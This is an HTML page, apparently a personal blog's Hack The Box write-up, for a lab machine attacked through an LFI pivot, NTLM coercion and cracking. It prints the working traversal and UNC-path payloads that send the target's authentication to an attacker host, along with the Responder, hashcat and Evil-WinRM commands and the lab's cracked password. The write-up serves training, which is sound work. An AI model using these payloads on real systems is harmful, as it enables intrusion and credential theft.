@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Responder — LFI to Coerced NTLM Auth to WinRM</title>
+<style>
+  * { box-sizing: border-box; }
+  html { background-color: #0a0e27; }
+  body {
+    background-color: rgba(10, 14, 39, 0.9);
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  .subtitle { color: #66d9ef; font-size: 1em; margin-bottom: 20px; }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.veasy {
+    background: rgba(199,36,255,0.2);
+    color: #c724ff;
+    border-color: #c724ff;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .callout strong { color: #66d9ef; }
+  .callout.warn strong { color: #ffd000; }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 8px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  strong { color: #fff; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  /* Screenshot figures */
+  figure {
+    margin: 24px 0;
+    border: 1px solid #232a4d;
+    border-radius: 6px;
+    overflow: hidden;
+    background: #000;
+  }
+  figure img { display: block; width: 100%; height: auto; }
+  figcaption {
+    padding: 10px 14px;
+    font-size: 0.82em;
+    color: #888;
+    background: #10152e;
+    border-top: 1px solid #232a4d;
+  }
+  /* Attack-chain block */
+  .chain {
+    background: #10152e;
+    border: 1px solid #232a4d;
+    border-left: 3px solid #00ff88;
+    border-radius: 4px;
+    padding: 20px 24px;
+    font-size: 0.9em;
+    color: #00ff88;
+    white-space: pre-wrap;
+    line-height: 1.9;
+    overflow-x: auto;
+  }
+  .chain .arrow { color: #66d9ef; }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Responder</h1>
+<div class="subtitle">LFI &rarr; Coerced NTLM Auth &rarr; Credential Cracking &rarr; Remote Access</div>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag veasy">VERY EASY</span>
+  <span class="tag">WINDOWS</span>
+  <span class="tag">LFI</span>
+  <span class="tag">NTLM COERCION</span>
+  <span class="tag">RESPONDER</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; SUMMARY</h2>
+<p>
+  A Windows Server host running Apache/PHP (XAMPP) hosted a corporate website ("Unika") vulnerable to
+  Local File Inclusion via a <code>page</code> GET parameter. This LFI was leveraged beyond simple file
+  disclosure &mdash; by supplying a UNC path instead of a local file path, the target's PHP
+  <code>include()</code> function was coerced into initiating an outbound SMB connection to an
+  attacker-controlled listener. This is a textbook LFI-to-RFI pivot, and it forced the target to
+  authenticate via NTLM to a locally-hosted Responder instance, leaking a crackable NTLMv2-SSP hash for
+  the local Administrator account. The hash was cracked offline with hashcat against rockyou.txt,
+  yielding valid credentials used to obtain a full interactive shell via WinRM (Evil-WinRM), ultimately
+  reaching a flag in a secondary user's directory.
+</p>
+
+<h2>&gt; RECON</h2>
+<p>Initial full-port service discovery:</p>
+<pre><code>sudo nmap -sC -sV -A -p- --min-rate 5000 &lt;target&gt;</code></pre>
+
+<table>
+  <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+  <tr><td>80/tcp</td><td>http</td><td>Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</td></tr>
+  <tr><td>5985/tcp</td><td>http</td><td>Microsoft HTTPAPI httpd 2.0 (WinRM)</td></tr>
+</table>
+
+<figure>
+  <img src="images/03-nmap-recon.png" alt="Full nmap scan results showing ports 80 and 5985">
+  <figcaption>Full-port nmap scan confirming Apache/PHP on 80 and WinRM on 5985</figcaption>
+</figure>
+
+<p>
+  <code>http-title</code> on port 80 resolved to <strong>"Unika"</strong> &mdash; a web design agency
+  template site. Port 5985 confirmed WinRM was enabled, flagging it early as the likely final access
+  vector once credentials were obtained. OS fingerprinting suggested Windows 10 / Server 2019, later
+  confirmed via file paths (<code>C:\xampp\htdocs\</code>) as a Windows host running XAMPP.
+</p>
+
+<div class="callout">
+  <strong>Key takeaway:</strong> Apache + PHP running natively on a Windows host (rather than a Linux
+  backend) was the first hint that any file-inclusion vulnerability could be abused for SMB/NTLM
+  coercion &mdash; a technique that only works because Windows natively resolves UNC paths
+  (<code>\\ip\share</code>) at the OS level.
+</div>
+
+<h2>&gt; ENUMERATION</h2>
+<p>Directory brute-force against the raw IP:</p>
+<pre><code>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50</code></pre>
+
+<p>
+  This returned mostly standard site scaffolding (<code>/img</code>, <code>/css</code>, <code>/js</code>,
+  <code>/inc</code>) with no immediately obvious attack surface. Requesting <code>index.php</code>
+  directly returned an HTTP redirect:
+</p>
+<pre><code>&lt;meta http-equiv="refresh" content="0;url=http://unika.htb/"&gt;</code></pre>
+
+<p>This revealed the site was <strong>virtual-host bound</strong> &mdash; the application would only render correctly when accessed via its configured hostname. This was added locally:</p>
+<pre><code>echo "&lt;target&gt; unika.htb" | sudo tee -a /etc/hosts</code></pre>
+
+<div class="callout">
+  <strong>Lesson reinforced:</strong> Any <code>.local</code>/<code>.htb</code>-style hostname surfacing
+  in a redirect, cert CN, or NetBIOS name should be treated as a signal that vhost-based routing is
+  active &mdash; access by bare IP alone will not reach the real application.
+</div>
+
+<p>
+  With the vhost resolved, the site rendered a full multi-page corporate template with a
+  language-switcher hinting at a <code>page</code>/<code>lang</code>-style GET parameter used to
+  dynamically include page content &mdash; a common and historically vulnerable PHP pattern
+  (<code>include($_GET['page'] . '.html')</code>).
+</p>
+
+<h2>&gt; EXPLOITATION — LOCAL FILE INCLUSION</h2>
+<p>Testing directory traversal against the identified parameter confirmed classic LFI:</p>
+<pre><code>http://unika.htb/index.php?page=german.html../../../../../../../windows/system32/drivers/etc/hosts</code></pre>
+
+<p>This returned the full contents of the target's Windows <code>hosts</code> file, unambiguously confirming:</p>
+<ul>
+  <li>The vulnerable parameter was <code>page</code> (not <code>lang</code>).</li>
+  <li>The include function had no path sanitization or filtering.</li>
+  <li>The backend was Windows-hosted PHP (XAMPP, <code>C:\xampp\htdocs\index.php</code>).</li>
+</ul>
+
+<h3>Pivoting LFI into NTLM Hash Capture</h3>
+<p>
+  Rather than stopping at file disclosure, the same <code>page</code> parameter was supplied a
+  <strong>UNC path</strong> pointing at the attacker's own Parrot OS VM:
+</p>
+<pre><code>http://unika.htb/index.php?page=\\&lt;attacker_ip&gt;\share</code></pre>
+
+<p>With Responder already listening on <code>tun0</code>:</p>
+<pre><code>sudo responder -I tun0</code></pre>
+
+<p>
+  PHP's <code>include()</code> attempted to resolve the UNC path as a filesystem object. Windows' native
+  SMB client transparently attempted to authenticate to the attacker-hosted share to fetch it &mdash;
+  and failed to actually retrieve content (throwing a PHP <code>include()</code> warning), but
+  <strong>not before completing an NTLM authentication handshake</strong> against Responder's fake SMB
+  server.
+</p>
+
+<figure>
+  <img src="images/01-responder-hash-capture.png" alt="Responder capturing the NTLMv2-SSP hash for RESPONDER\Administrator">
+  <figcaption>Responder capturing the NTLMv2-SSP hash for RESPONDER\Administrator</figcaption>
+</figure>
+
+<div class="callout warn">
+  <strong>Key lesson:</strong> An LFI does not need to
+  successfully render the included file to be dangerous. A <em>failed</em> <code>include()</code>
+  against a remote/UNC target can still trigger a real, exploitable side effect (an authentication
+  handshake) before the failure is surfaced to the application layer. The impact here isn't file
+  disclosure &mdash; it's coerced credential leakage.
+</div>
+
+<h2>&gt; CREDENTIAL CRACKING</h2>
+<p>The captured hash was extracted from Responder's log directory and cracked offline:</p>
+<pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<figure>
+  <img src="images/02-hashcat-cracked.png" alt="hashcat cracking the NetNTLMv2 hash to reveal the plaintext password">
+  <figcaption>hashcat cracking the NetNTLMv2 hash &mdash; plaintext recovered in under a second</figcaption>
+</figure>
+
+<p><strong>Cracked credentials:</strong></p>
+<pre><code>Username: Administrator
+Password: badminton</code></pre>
+
+<p>
+  Full crack time was under a second against rockyou.txt &mdash; confirming the target's local
+  Administrator account was configured with a weak, dictionary-crackable password.
+</p>
+
+<h2>&gt; POST-EXPLOITATION — REMOTE ACCESS</h2>
+<p>
+  With valid local Administrator credentials and WinRM confirmed open on 5985, access was obtained
+  directly via Evil-WinRM:
+</p>
+<pre><code>evil-winrm -i &lt;target&gt; -u Administrator -p 'badminton'</code></pre>
+
+<p>This dropped into a fully interactive PowerShell session as Administrator. From there, a secondary local account (<code>mike</code>) was identified under <code>C:\Users\</code>, containing the objective flag on their Desktop:</p>
+<pre><code>cd C:\Users\mike\Desktop
+dir
+type flag.txt</code></pre>
+
+<figure>
+  <img src="images/04-evil-winrm-flag.png" alt="Evil-WinRM session navigating to mike's Desktop and reading the flag">
+  <figcaption>Evil-WinRM session locating and reading flag.txt from mike's Desktop (flag redacted)</figcaption>
+</figure>
+
+<p><strong>Flag:</strong> <code>[flag redacted]</code></p>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+<div class="chain">nmap recon (80/tcp Apache-PHP, 5985/tcp WinRM)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+vhost discovery (unika.htb via meta-refresh redirect)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+LFI in "page" parameter (directory traversal confirmed via hosts file read)
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+LFI → RFI pivot: UNC path (\\attacker_ip\share) fed to include()
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Target authenticates via SMB/NTLM to attacker's Responder listener
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+NTLMv2-SSP hash captured for RESPONDER\Administrator
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Offline crack via hashcat (-m 5600) against rockyou.txt → "badminton"
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+WinRM access via Evil-WinRM as Administrator
+        <span class="arrow">│</span>
+        <span class="arrow">▼</span>
+Flag retrieved from secondary user (mike) Desktop</div>
+
+<h2>&gt; KEY TAKEAWAYS</h2>
+<ol>
+  <li><strong>LFI doesn't need to succeed to be exploitable.</strong> A PHP <code>include()</code> that fails to resolve a UNC path still triggers OS-level SMB authentication before the failure bubbles up &mdash; a distinct and separately dangerous outcome from classic file disclosure.</li>
+  <li><strong>Windows-hosted web stacks (XAMPP/WAMP) turn LFI into a credential-harvesting primitive</strong> in a way Linux-hosted equivalents typically cannot, because the underlying OS natively resolves UNC paths.</li>
+  <li><strong>Vhost-bound applications will silently misbehave (or redirect) when accessed by raw IP.</strong> Always check for <code>.htb</code>/<code>.local</code> hostnames in redirects, TLS cert CNs, or NetBIOS output early in recon.</li>
+  <li><strong>Weak local admin passwords remain a live risk</strong> even on otherwise well-configured hosts. The technical chain here is moot without a crackable password at the end of it &mdash; always attempt an offline crack pass.</li>
+  <li><strong>Evil-WinRM is the fastest path to shell</strong> once valid local creds are in hand whenever 5985/tcp is confirmed open &mdash; no exploit chaining required at that point.</li>
+</ol>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+    <!-- Matrix Rain Effect — full-page backdrop behind all content -->
+    <canvas id="matrix-rain"></canvas>
+    <script>
+        // Full-width Matrix rain rendered as a fixed backdrop across the whole
+        // page. z-index:-1 + pointer-events:none keep it strictly BEHIND the
+        // content so it never runs over text, tags, code blocks or images.
+        (function () {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.opacity = '0.4';
+
+            const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ01234567890@#$%^&*()';
+            const fontSize = 16;
+            let drops = [];
+
+            function initColumns() {
+                const columns = Math.floor(canvas.width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            }
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                initColumns();
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            resize();
+            setInterval(draw, 50);
+            window.addEventListener('resize', resize);
+        })();
+    </script>
+
+</body>
+</html>
